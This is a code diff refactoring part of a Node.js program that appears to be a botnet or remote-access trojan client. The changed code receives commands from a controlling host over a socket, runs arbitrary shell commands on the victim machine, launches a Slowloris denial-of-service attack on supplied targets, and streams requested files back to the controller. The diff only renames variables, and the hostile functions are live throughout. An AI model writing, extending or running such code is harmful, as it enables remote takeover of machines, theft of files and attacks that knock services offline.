@@ -37,29 +37,25 @@ function clearIntervalConnect() {
 }
 
 function sendFile(filePath) {
-	const fileStream = fs.createReadStream(filePath);
+	const readStream = fs.createReadStream(filePath);
 
-	fileStream.on("data", (chunk) => {
+	readStream.on("data", (chunk) => {
 		client.write(chunk);
-	})
-
-	fileStream.on("error", (err) => {
-		console.log(err);
 	});
 
-	// fileStream.on("open", () => {
-	// 	fileStream.pipe(client);
-	// });
+	readStream.on("error", (err) => {
+		console.log(err);
+	});
 }
 
 client.on("data", (data) => {
 	const dataStr = data.toString();
 
 	const commandArgs = {
-		firstArg: dataStr.split(" ")[1],
-		secondArg: dataStr.split(" ")[2],
-		thirdArg: dataStr.split(" ")[3],
-		fourthArg: dataStr.split(" ")[4],
+		first: dataStr.split(" ")[1],
+		second: dataStr.split(" ")[2],
+		third: dataStr.split(" ")[3],
+		fourth: dataStr.split(" ")[4],
 	};
 
 	async function execute(command) {
@@ -73,7 +69,7 @@ client.on("data", (data) => {
 	}
 
 	if (dataStr.startsWith("exec")) {
-		if (commandArgs.firstArg === "cd") {
+		if (commandArgs.first === "cd") {
 			path = changeDir(data, path);
 		}
 		execute(dataStr.replace("exec", ""));
@@ -81,15 +77,15 @@ client.on("data", (data) => {
 
 	if (dataStr.startsWith("slowloris")) {
 		slowLoris(
-			commandArgs.firstArg,
-			commandArgs.secondArg,
-			commandArgs.thirdArg,
-			commandArgs.fourthArg
+			commandArgs.first,
+			commandArgs.second,
+			commandArgs.third,
+			commandArgs.fourth
 		);
 	}
 
 	if (dataStr.startsWith("yank")) {
-		sendFile(path + "\\" + commandArgs.firstArg);
+		sendFile(path + "\\" + commandArgs.first);
 	}
 });
 
